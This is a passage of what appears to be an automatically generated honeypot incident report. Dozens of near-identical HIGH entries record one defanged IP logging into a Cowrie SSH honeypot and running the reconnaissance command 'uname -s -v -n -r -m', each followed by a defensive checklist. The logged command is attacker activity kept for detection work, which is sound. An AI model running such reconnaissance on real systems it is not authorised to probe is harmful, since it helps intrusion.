- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d3892d6c035

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:57 |
| **Last Seen** | 2026-08-08 16:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:57:31` | `cowrie.session.connect` |
| `2026-08-08 16:57:31` | `cowrie.client.version` |
| `2026-08-08 16:57:31` | `cowrie.client.kex` |
| `2026-08-08 16:57:32` | `cowrie.login.success` |
| `2026-08-08 16:57:34` | `cowrie.session.params` |
| `2026-08-08 16:57:34` | `cowrie.command.input` |
| `2026-08-08 16:57:34` | `cowrie.log.closed` |
| `2026-08-08 16:57:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b1d3a95b41c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:57 |
| **Last Seen** | 2026-08-08 16:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:57:39` | `cowrie.session.connect` |
| `2026-08-08 16:57:39` | `cowrie.client.version` |
| `2026-08-08 16:57:39` | `cowrie.client.kex` |
| `2026-08-08 16:57:39` | `cowrie.login.success` |
| `2026-08-08 16:57:40` | `cowrie.session.params` |
| `2026-08-08 16:57:40` | `cowrie.command.input` |
| `2026-08-08 16:57:41` | `cowrie.log.closed` |
| `2026-08-08 16:57:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ed2792f05e5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:57 |
| **Last Seen** | 2026-08-08 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:57:45` | `cowrie.session.connect` |
| `2026-08-08 16:57:45` | `cowrie.client.version` |
| `2026-08-08 16:57:45` | `cowrie.client.kex` |
| `2026-08-08 16:57:45` | `cowrie.login.success` |
| `2026-08-08 16:57:46` | `cowrie.session.params` |
| `2026-08-08 16:57:46` | `cowrie.command.input` |
| `2026-08-08 16:57:47` | `cowrie.log.closed` |
| `2026-08-08 16:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50c51c9217bb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:57 |
| **Last Seen** | 2026-08-08 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:57:51` | `cowrie.session.connect` |
| `2026-08-08 16:57:51` | `cowrie.client.version` |
| `2026-08-08 16:57:51` | `cowrie.client.kex` |
| `2026-08-08 16:57:51` | `cowrie.login.success` |
| `2026-08-08 16:57:52` | `cowrie.session.params` |
| `2026-08-08 16:57:52` | `cowrie.command.input` |
| `2026-08-08 16:57:52` | `cowrie.log.closed` |
| `2026-08-08 16:57:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fa0e541a4a3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:57 |
| **Last Seen** | 2026-08-08 16:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:57:57` | `cowrie.session.connect` |
| `2026-08-08 16:57:57` | `cowrie.client.version` |
| `2026-08-08 16:57:57` | `cowrie.client.kex` |
| `2026-08-08 16:57:59` | `cowrie.login.success` |
| `2026-08-08 16:58:00` | `cowrie.session.params` |
| `2026-08-08 16:58:00` | `cowrie.command.input` |
| `2026-08-08 16:58:00` | `cowrie.log.closed` |
| `2026-08-08 16:58:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6dc0843a898

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:58 |
| **Last Seen** | 2026-08-08 16:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:58:04` | `cowrie.session.connect` |
| `2026-08-08 16:58:04` | `cowrie.client.version` |
| `2026-08-08 16:58:04` | `cowrie.client.kex` |
| `2026-08-08 16:58:04` | `cowrie.login.success` |
| `2026-08-08 16:58:05` | `cowrie.session.params` |
| `2026-08-08 16:58:05` | `cowrie.command.input` |
| `2026-08-08 16:58:05` | `cowrie.log.closed` |
| `2026-08-08 16:58:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f412e88b688c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:58 |
| **Last Seen** | 2026-08-08 16:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:58:10` | `cowrie.session.connect` |
| `2026-08-08 16:58:10` | `cowrie.client.version` |
| `2026-08-08 16:58:10` | `cowrie.client.kex` |
| `2026-08-08 16:58:11` | `cowrie.login.success` |
| `2026-08-08 16:58:11` | `cowrie.session.params` |
| `2026-08-08 16:58:11` | `cowrie.command.input` |
| `2026-08-08 16:58:12` | `cowrie.log.closed` |
| `2026-08-08 16:58:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5083dcfcc55a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:58 |
| **Last Seen** | 2026-08-08 16:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:58:16` | `cowrie.session.connect` |
| `2026-08-08 16:58:16` | `cowrie.client.version` |
| `2026-08-08 16:58:16` | `cowrie.client.kex` |
| `2026-08-08 16:58:17` | `cowrie.login.success` |
| `2026-08-08 16:58:18` | `cowrie.session.params` |
| `2026-08-08 16:58:18` | `cowrie.command.input` |
| `2026-08-08 16:58:19` | `cowrie.log.closed` |
| `2026-08-08 16:58:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbf9bff7a36b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:58 |
| **Last Seen** | 2026-08-08 16:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:58:22` | `cowrie.session.connect` |
| `2026-08-08 16:58:22` | `cowrie.client.version` |
| `2026-08-08 16:58:22` | `cowrie.client.kex` |
| `2026-08-08 16:58:24` | `cowrie.login.success` |
| `2026-08-08 16:58:26` | `cowrie.session.params` |
| `2026-08-08 16:58:26` | `cowrie.command.input` |
| `2026-08-08 16:58:26` | `cowrie.log.closed` |
| `2026-08-08 16:58:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3456a95b17e4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:58 |
| **Last Seen** | 2026-08-08 16:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:58:28` | `cowrie.session.connect` |
| `2026-08-08 16:58:28` | `cowrie.client.version` |
| `2026-08-08 16:58:28` | `cowrie.client.kex` |
| `2026-08-08 16:58:30` | `cowrie.login.success` |
| `2026-08-08 16:58:31` | `cowrie.session.params` |
| `2026-08-08 16:58:31` | `cowrie.command.input` |
| `2026-08-08 16:58:32` | `cowrie.log.closed` |
| `2026-08-08 16:58:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33247a485866

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:58 |
| **Last Seen** | 2026-08-08 16:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:58:34` | `cowrie.session.connect` |
| `2026-08-08 16:58:34` | `cowrie.client.version` |
| `2026-08-08 16:58:34` | `cowrie.client.kex` |
| `2026-08-08 16:58:36` | `cowrie.login.success` |
| `2026-08-08 16:58:37` | `cowrie.session.params` |
| `2026-08-08 16:58:37` | `cowrie.command.input` |
| `2026-08-08 16:58:38` | `cowrie.log.closed` |
| `2026-08-08 16:58:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a45866aac703

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:58 |
| **Last Seen** | 2026-08-08 16:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:58:41` | `cowrie.session.connect` |
| `2026-08-08 16:58:41` | `cowrie.client.version` |
| `2026-08-08 16:58:41` | `cowrie.client.kex` |
| `2026-08-08 16:58:42` | `cowrie.login.success` |
| `2026-08-08 16:58:43` | `cowrie.session.params` |
| `2026-08-08 16:58:43` | `cowrie.command.input` |
| `2026-08-08 16:58:43` | `cowrie.log.closed` |
| `2026-08-08 16:58:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e75ccbd51c2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:58 |
| **Last Seen** | 2026-08-08 16:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:58:47` | `cowrie.session.connect` |
| `2026-08-08 16:58:48` | `cowrie.client.version` |
| `2026-08-08 16:58:48` | `cowrie.client.kex` |
| `2026-08-08 16:58:50` | `cowrie.login.success` |
| `2026-08-08 16:58:51` | `cowrie.session.params` |
| `2026-08-08 16:58:51` | `cowrie.command.input` |
| `2026-08-08 16:58:52` | `cowrie.log.closed` |
| `2026-08-08 16:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26edef91accc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:58 |
| **Last Seen** | 2026-08-08 16:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:58:53` | `cowrie.session.connect` |
| `2026-08-08 16:58:54` | `cowrie.client.version` |
| `2026-08-08 16:58:54` | `cowrie.client.kex` |
| `2026-08-08 16:58:55` | `cowrie.login.success` |
| `2026-08-08 16:58:56` | `cowrie.session.params` |
| `2026-08-08 16:58:56` | `cowrie.command.input` |
| `2026-08-08 16:58:57` | `cowrie.log.closed` |
| `2026-08-08 16:58:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-814dfd71d824

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:59 |
| **Last Seen** | 2026-08-08 16:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:59:00` | `cowrie.session.connect` |
| `2026-08-08 16:59:00` | `cowrie.client.version` |
| `2026-08-08 16:59:00` | `cowrie.client.kex` |
| `2026-08-08 16:59:01` | `cowrie.login.success` |
| `2026-08-08 16:59:02` | `cowrie.session.params` |
| `2026-08-08 16:59:02` | `cowrie.command.input` |
| `2026-08-08 16:59:02` | `cowrie.log.closed` |
| `2026-08-08 16:59:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8fc93afe881

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:59 |
| **Last Seen** | 2026-08-08 16:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:59:06` | `cowrie.session.connect` |
| `2026-08-08 16:59:06` | `cowrie.client.version` |
| `2026-08-08 16:59:06` | `cowrie.client.kex` |
| `2026-08-08 16:59:07` | `cowrie.login.success` |
| `2026-08-08 16:59:08` | `cowrie.session.params` |
| `2026-08-08 16:59:08` | `cowrie.command.input` |
| `2026-08-08 16:59:08` | `cowrie.log.closed` |
| `2026-08-08 16:59:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04440fb5c505

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:59 |
| **Last Seen** | 2026-08-08 16:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:59:13` | `cowrie.session.connect` |
| `2026-08-08 16:59:13` | `cowrie.client.version` |
| `2026-08-08 16:59:13` | `cowrie.client.kex` |
| `2026-08-08 16:59:13` | `cowrie.login.success` |
| `2026-08-08 16:59:14` | `cowrie.session.params` |
| `2026-08-08 16:59:14` | `cowrie.command.input` |
| `2026-08-08 16:59:15` | `cowrie.log.closed` |
| `2026-08-08 16:59:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cc096df2a4f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:59 |
| **Last Seen** | 2026-08-08 16:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:59:18` | `cowrie.session.connect` |
| `2026-08-08 16:59:18` | `cowrie.client.version` |
| `2026-08-08 16:59:18` | `cowrie.client.kex` |
| `2026-08-08 16:59:19` | `cowrie.login.success` |
| `2026-08-08 16:59:20` | `cowrie.session.params` |
| `2026-08-08 16:59:20` | `cowrie.command.input` |
| `2026-08-08 16:59:20` | `cowrie.log.closed` |
| `2026-08-08 16:59:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d2f7a0867c6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:59 |
| **Last Seen** | 2026-08-08 16:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:59:24` | `cowrie.session.connect` |
| `2026-08-08 16:59:24` | `cowrie.client.version` |
| `2026-08-08 16:59:24` | `cowrie.client.kex` |
| `2026-08-08 16:59:25` | `cowrie.login.success` |
| `2026-08-08 16:59:25` | `cowrie.session.params` |
| `2026-08-08 16:59:25` | `cowrie.command.input` |
| `2026-08-08 16:59:26` | `cowrie.log.closed` |
| `2026-08-08 16:59:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d983c8cc1cc5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:59 |
| **Last Seen** | 2026-08-08 16:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:59:30` | `cowrie.session.connect` |
| `2026-08-08 16:59:30` | `cowrie.client.version` |
| `2026-08-08 16:59:31` | `cowrie.client.kex` |
| `2026-08-08 16:59:31` | `cowrie.login.success` |
| `2026-08-08 16:59:32` | `cowrie.session.params` |
| `2026-08-08 16:59:32` | `cowrie.command.input` |
| `2026-08-08 16:59:32` | `cowrie.log.closed` |
| `2026-08-08 16:59:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5941cdb81e40

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:59 |
| **Last Seen** | 2026-08-08 16:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:59:37` | `cowrie.session.connect` |
| `2026-08-08 16:59:37` | `cowrie.client.version` |
| `2026-08-08 16:59:37` | `cowrie.client.kex` |
| `2026-08-08 16:59:38` | `cowrie.login.success` |
| `2026-08-08 16:59:39` | `cowrie.session.params` |
| `2026-08-08 16:59:39` | `cowrie.command.input` |
| `2026-08-08 16:59:39` | `cowrie.log.closed` |
| `2026-08-08 16:59:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c5a6423f044

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:59 |
| **Last Seen** | 2026-08-08 16:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:59:43` | `cowrie.session.connect` |
| `2026-08-08 16:59:43` | `cowrie.client.version` |
| `2026-08-08 16:59:43` | `cowrie.client.kex` |
| `2026-08-08 16:59:44` | `cowrie.login.success` |
| `2026-08-08 16:59:45` | `cowrie.session.params` |
| `2026-08-08 16:59:45` | `cowrie.command.input` |
| `2026-08-08 16:59:45` | `cowrie.log.closed` |
| `2026-08-08 16:59:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cf14285c691

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:59 |
| **Last Seen** | 2026-08-08 16:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:59:49` | `cowrie.session.connect` |
| `2026-08-08 16:59:50` | `cowrie.client.version` |
| `2026-08-08 16:59:50` | `cowrie.client.kex` |
| `2026-08-08 16:59:51` | `cowrie.login.success` |
| `2026-08-08 16:59:53` | `cowrie.session.params` |
| `2026-08-08 16:59:53` | `cowrie.command.input` |
| `2026-08-08 16:59:53` | `cowrie.log.closed` |
| `2026-08-08 16:59:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0663033510f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 16:59 |
| **Last Seen** | 2026-08-08 16:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 16:59:57` | `cowrie.session.connect` |
| `2026-08-08 16:59:57` | `cowrie.client.version` |
| `2026-08-08 16:59:57` | `cowrie.client.kex` |
| `2026-08-08 16:59:58` | `cowrie.login.success` |
| `2026-08-08 16:59:59` | `cowrie.session.params` |
| `2026-08-08 16:59:59` | `cowrie.command.input` |
| `2026-08-08 16:59:59` | `cowrie.log.closed` |
| `2026-08-08 16:59:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aab33dee5009

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:00 |
| **Last Seen** | 2026-08-08 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:00:04` | `cowrie.session.connect` |
| `2026-08-08 17:00:04` | `cowrie.client.version` |
| `2026-08-08 17:00:04` | `cowrie.client.kex` |
| `2026-08-08 17:00:05` | `cowrie.login.success` |
| `2026-08-08 17:00:05` | `cowrie.session.params` |
| `2026-08-08 17:00:05` | `cowrie.command.input` |
| `2026-08-08 17:00:06` | `cowrie.log.closed` |
| `2026-08-08 17:00:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87ccbefa4eed

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:00 |
| **Last Seen** | 2026-08-08 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:00:11` | `cowrie.session.connect` |
